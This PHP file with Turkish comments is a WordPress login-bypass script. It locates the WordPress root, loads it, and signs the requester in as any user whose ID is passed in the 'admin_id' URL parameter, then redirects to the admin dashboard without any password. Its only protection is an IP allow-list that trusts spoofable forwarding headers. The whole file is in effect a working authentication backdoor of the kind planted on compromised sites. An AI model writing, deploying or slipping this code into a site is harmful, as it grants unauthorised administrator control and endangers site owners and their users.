<?php
// IP adresini güvenilir bir şekilde algılayan fonksiyon
function get_client_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // İlk IP adresini alın
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }
    return '0.0.0.0'; // Varsayılan olarak döndürülen IP
}

// IP erişim kontrolü
$allowed_ips = ['75.119.138.127']; // İzin verilen IP adresleri
$client_ip = get_client_ip(); // Gerçek IP adresini al

if (!in_array($client_ip, $allowed_ips)) {
    die('Bu dosyaya erişim yetkiniz yok.');
}

// WordPress kök dizinini bulmak için üst dizinleri tarayan fonksiyon
function find_wordpress_root($current_dir)
{
    while (!file_exists($current_dir . DIRECTORY_SEPARATOR . 'wp-blog-header.php')) {
        $parent_dir = dirname($current_dir);
        if ($parent_dir === $current_dir) {
            return false; // WordPress bulunamadı
        }
        $current_dir = $parent_dir;
    }
    return $current_dir;
}

// Geçerli dizinden başlayarak WordPress kök dizinini bul
$wordpress_root = find_wordpress_root(__DIR__);

if (!$wordpress_root) {
    die('WordPress yüklemesi bulunamadı.');
}

require_once $wordpress_root . DIRECTORY_SEPARATOR . 'wp-blog-header.php';

// Uzaktan admin kullanıcı ID'sini belirleme
if (empty($_GET['admin_id'])) {
    die('Admin ID belirtilmedi! URL ile admin_id parametresini sağlayın.');
}

$admin_user_id = (int) $_GET['admin_id']; // URL'den admin ID'si alınıyor

$user_data = get_user_by('ID', $admin_user_id);

if ($user_data && !is_wp_error($user_data)) {
    wp_clear_auth_cookie();
    wp_set_current_user($user_data->ID);
    wp_set_auth_cookie($user_data->ID);

    // Güvenli yönlendirme
    $redirect_to = admin_url();
    if (wp_validate_redirect($redirect_to)) {
        wp_safe_redirect($redirect_to);
        exit();
    }
} else {
    die('Belirtilen admin kullanıcı bulunamadı.');
}
?>